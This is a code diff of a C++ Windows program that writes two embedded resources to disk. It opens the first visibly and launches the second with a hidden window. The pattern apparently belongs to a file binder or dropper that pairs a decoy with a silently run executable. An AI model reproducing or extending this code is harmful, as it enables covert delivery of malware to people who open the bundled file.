@@ -116,36 +116,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 
     char* res1_path = write_resource(RES1, szExe, RESLEN1);
     if (res1_path){
-        std::string res1_path_str = res1_path;
-        std::string cmd;
-        if (!endsWith(res1_path_str, ".exe")){
-            cmd = "cmd.exe /c \"" + res1_path_str + "\"";
-        }else{
-            cmd = res1_path_str;
-        }
-
-        STARTUPINFO si = {sizeof(si)};
-        PROCESS_INFORMATION pi;
-        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
-        si.wShowWindow = nCmdShow;
-
-        BOOL bRet = CreateProcess (
-            NULL,   // 不在此指定可执行文件的文件名
-            (LPSTR)cmd.c_str(),    // 命令行参数
-            NULL,   // 默认进程安全性
-            NULL,   // 默认进程安全性
-            false,  // 指定当前进程内句柄不可以被子进程继承
-            false,   // 为新进程创建一个新的控制台窗口
-            NULL,   // 使用本进程的环境变量
-            NULL,   // 使用本进程的驱动器和目录
-            &si,
-            &pi);
-        if(bRet){
-            // 不使用的句柄最好关掉
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
-            // printf("[+] sub process id: %d\n", pi.dwProcessId);
-        }
+        ShellExecute(NULL, "open", res1_path, NULL, ".", SW_SHOW);
     }
 
     // MessageBoxA(NULL, "bu luodi jiazai res2!", "提示", MB_OK);
@@ -158,13 +129,13 @@ int APIENTRY WinMain(HINSTANCE hInstance,
             si2.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
             si2.wShowWindow = SW_HIDE;
 
-            BOOL bRet2 = CreateProcess (
+            BOOL bRet2 = CreateProcessA(
                 NULL,       // 不在此指定可执行文件的文件名
                 res2_path,  // 命令行参数
                 NULL,   // 默认进程安全性
                 NULL,   // 默认进程安全性
                 false,  // 指定当前进程内句柄不可以被子进程继承
-                false,   // 为新进程创建一个新的控制台窗口
+                false,  // 为新进程创建一个新的控制台窗口
                 NULL,   // 使用本进程的环境变量
                 NULL,   // 使用本进程的驱动器和目录
                 &si2,
